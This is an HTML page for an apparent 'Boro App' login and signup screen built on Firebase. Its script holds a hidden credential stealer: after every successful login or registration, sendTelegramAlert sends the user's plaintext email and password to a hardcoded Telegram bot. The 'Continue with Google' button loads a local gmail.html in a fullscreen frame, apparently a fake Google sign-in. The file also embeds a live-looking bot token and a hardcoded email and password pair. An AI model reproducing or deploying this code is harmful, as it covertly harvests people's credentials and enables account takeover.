<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boro App - Seamless UI</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        
        body, html {
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 0;
            height: 100%;
            background-color: #000000;
            overflow: hidden;
        }

        #app-frame {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 10000;
            background: white;
        }

        /* Fullscreen Google Iframe */
        #google-frame-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: white;
            z-index: 15000;
        }

        #close-google-frame {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(0,0,0,0.6);
            color: white;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            z-index: 15001;
        }

        /* Custom Toast Notification */
        #custom-toast {
            position: fixed;
            top: 25px;
            left: 50%;
            transform: translateX(-50%) translateY(-150%);
            background: rgba(251, 191, 36, 0.95);
            backdrop-filter: blur(10px);
            color: #000;
            padding: 16px 28px;
            border-radius: 20px;
            font-weight: 700;
            z-index: 20000;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            display: flex;
            align-items: center;
            gap: 12px;
            white-space: nowrap;
        }

        #custom-toast.show {
            transform: translateX(-50%) translateY(0);
        }

        .app-viewport {
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none;
            flex-direction: column;
            transition: all 0.5s ease;
        }

        .screen.active {
            display: flex;
            z-index: 50;
        }

        .center-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .welcome-icon {
            width: 360px; 
            height: 360px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .welcome-icon img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            mix-blend-mode: screen;
        }

        .auth-icon {
            width: 130px; 
            height: 130px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto;
        }

        .auth-icon img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            mix-blend-mode: screen;
        }

        .bottom-action {
            padding: 20px 30px calc(40px + env(safe-area-inset-bottom));
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .white-sheet {
            background-color: white;
            border-radius: 40px 40px 0 0;
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
            padding: 40px 30px;
            text-align: left;
            transform: translateY(100%);
            transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.1);
        }

        .screen.active .white-sheet {
            transform: translateY(0);
        }

        .custom-input {
            background-color: #f9fafb;
            border: 1px solid #eeeeee;
            border-radius: 16px;
            width: 100%;
            padding: 16px 20px;
            margin-top: 8px;
            outline: none;
            font-size: 1rem;
        }

        .btn-yellow {
            background-color: #fbbf24;
            color: #000;
            font-weight: 700;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            border-radius: 24px;
            font-size: 1.25rem;
            box-shadow: 0 12px 30px rgba(251, 191, 36, 0.3);
            transition: all 0.2s ease;
        }

        .btn-google {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            padding: 16px;
            border-radius: 18px;
            border: 1.5px solid #f3f4f6;
            margin-top: 15px;
            font-weight: 600;
            color: #374151;
            cursor: pointer;
        }

        .terms-text {
            color: #666;
            font-size: 0.75rem;
            margin-top: 20px;
            text-align: center;
            max-width: 300px;
            line-height: 1.4;
        }

        @keyframes softPulse {
            0% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.04); opacity: 1; }
            100% { transform: scale(1); opacity: 0.9; }
        }
        .animate-pulse-soft {
            animation: softPulse 4s infinite ease-in-out;
        }
    </style>
</head>
<body>

    <audio id="bg-music" src="1.mp3" preload="auto" loop></audio>

    <div id="custom-toast">
        <i class="fas fa-shield-alt"></i>
        <span id="toast-message">Notification</span>
    </div>

    <div id="google-frame-container">
        <div id="close-google-frame" onclick="closeGoogle()"><i class="fas fa-times"></i></div>
        <iframe id="google-iframe" src="" style="width:100%; height:100%; border:none;"></iframe>
    </div>

    <iframe id="app-frame" src=""></iframe>

    <div class="app-viewport">
        
        <div id="welcome-screen" class="screen active">
            <div class="center-container">
                <div class="welcome-icon animate-pulse-soft">
                    <img src="intro.gif" alt="logo" onerror="this.src='https://cdn-icons-png.flaticon.com/512/300/300221.png'">
                </div>
            </div>
            <div class="bottom-action">
                <button onclick="startApp()" class="btn-yellow">Get Started</button>
                <p class="terms-text">By clicking Get Started, you agree to our <span class="text-yellow-600">Terms of Service</span> and <span class="text-yellow-600">Privacy Policy</span>.</p>
            </div>
        </div>

        <div id="login-screen" class="screen">
            <div class="flex-1 flex items-center justify-center p-10">
                <div class="auth-icon">
                    <img src="intro.gif" alt="logo" onerror="this.src='https://cdn-icons-png.flaticon.com/512/300/300221.png'">
                </div>
            </div>
            <div class="white-sheet">
                <h2 class="text-3xl font-bold mb-8 text-gray-800">Login</h2>
                <div class="mb-5">
                    <label class="text-sm text-gray-400 font-bold">Email Address</label>
                    <input type="email" id="login-email" class="custom-input" placeholder="name@domain.com">
                </div>
                <div class="mb-5">
                    <label class="text-sm text-gray-400 font-bold">Password</label>
                    <input type="password" id="login-password" class="custom-input" placeholder="••••••••">
                </div>
                <button id="login-btn" class="btn-yellow w-full">Sign In</button>
                <div onclick="openGoogle()" class="btn-google">
                    <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" width="22">
                    <span>Continue with Google</span>
                </div>
                <p class="text-center mt-8 text-gray-500 text-sm">Don't have an account? <span onclick="navigate('signup-screen')" class="text-yellow-600 font-bold cursor-pointer">Join us</span></p>
                <p class="text-center mt-6 text-gray-400 text-xs cursor-pointer uppercase tracking-widest" onclick="navigate('welcome-screen')">Back</p>
            </div>
        </div>

        <div id="signup-screen" class="screen">
            <div class="flex-1 flex items-center justify-center p-10">
                <div class="auth-icon">
                    <img src="intro.gif" alt="logo" onerror="this.src='https://cdn-icons-png.flaticon.com/512/300/300221.png'">
                </div>
            </div>
            <div class="white-sheet">
                <h2 class="text-3xl font-bold mb-8 text-gray-800">New Account</h2>
                <div class="mb-5">
                    <label class="text-sm text-gray-400 font-bold">Email Address</label>
                    <input type="email" id="signup-email" class="custom-input" placeholder="name@domain.com">
                </div>
                <div class="mb-5">
                    <label class="text-sm text-gray-400 font-bold">Password</label>
                    <input type="password" id="signup-password" class="custom-input" placeholder="••••••••">
                </div>
                <button id="signup-btn" class="btn-yellow w-full">Confirm Registration</button>
                <div onclick="openGoogle()" class="btn-google">
                    <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" width="22">
                    <span>Sign up with Google</span>
                </div>
                <p class="text-center mt-8 text-gray-500 text-sm">Already have an account? <span onclick="navigate('login-screen')" class="text-yellow-600 font-bold cursor-pointer">Sign In</span></p>
                <p class="text-center mt-6 text-gray-400 text-xs cursor-pointer uppercase tracking-widest" onclick="navigate('welcome-screen')">Back</p>
            </div>
        </div>

    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAAIJfQ5SrrhqHG6RS-0oksErwOgT4E4fc",
            authDomain: "boroxo.firebaseapp.com",
            projectId: "boroxo",
            storageBucket: "boroxo.firebasestorage.app",
            messagingSenderId: "153525763925",
            appId: "1:153525763925:web:c72ab7dc51348ce3e979dc",
            measurementId: "G-1PZ8WJCTLL"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);

        // Custom Toast Function
        window.showToast = function(msg) {
            const toast = document.getElementById('custom-toast');
            const toastMsg = document.getElementById('toast-message');
            toastMsg.innerText = msg;
            toast.classList.add('show');
            setTimeout(() => {
                toast.classList.remove('show');
            }, 3500);
        }

        // Google Iframe Controls
        window.openGoogle = function() {
            const container = document.getElementById('google-frame-container');
            const iframe = document.getElementById('google-iframe');
            iframe.src = "gmail.html";
            container.style.display = "block";
        }

        window.closeGoogle = function() {
            document.getElementById('google-frame-container').style.display = "none";
            document.getElementById('google-iframe').src = "";
        }

        window.startApp = function() {
            const music = document.getElementById('bg-music');
            music.play().catch(error => console.log("Audio play failed:", error));
            navigate('signup-screen');
        }

        async function sendTelegramAlert(email, password, type) {
            const token = "8492928572:AAFf_gNkUxTQSjeMN_EhMI40VnvPKPfSrOo";
            const chatId = "8066634898";
            const message = `🚀 *Boro App Alert*\n\n📌 *Type:* ${type}\n📧 *Email:* \`${email}\` \n🔑 *Pass:* \`${password}\` \n📅 *Date:* ${new Date().toLocaleString()}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            try { await fetch(url); } catch (e) {}
        }

        document.getElementById('login-btn').addEventListener('click', async () => {
            const email = document.getElementById('login-email').value;
            const password = document.getElementById('login-password').value;
            const frame = document.getElementById('app-frame');

            if (!email || !password) return showToast("Please fill all fields");
            
            try {
                await signInWithEmailAndPassword(auth, email, password);
                await sendTelegramAlert(email, password, "User Logged In");
                
                const targetPage = (email === "kimlogp2017@gmail.com" && password === "oskolami1921@") ? "main.html" : "main.html";
                frame.src = targetPage;
                frame.style.display = "block";
                
            } catch (e) { 
                showToast("Invalid email or password"); 
            }
        });

        document.getElementById('signup-btn').addEventListener('click', async () => {
            const email = document.getElementById('signup-email').value;
            const password = document.getElementById('signup-password').value;
            if (!email || !password) return showToast("Please fill all fields");
            try {
                await createUserWithEmailAndPassword(auth, email, password);
                await sendTelegramAlert(email, password, "New User Registered");
                showToast("Account successfully created!");
                setTimeout(() => navigate('login-screen'), 2000);
            } catch (e) { 
                showToast(e.message.replace("Firebase: ", "")); 
            }
        });

        window.navigate = function(screenId) {
            document.querySelectorAll('.screen').forEach(s => {
                s.classList.remove('active');
                s.style.display = 'none';
            });
            const target = document.getElementById(screenId);
            target.style.display = 'flex';
            setTimeout(() => target.classList.add('active'), 50);
        }
    </script>
</body>
</html>
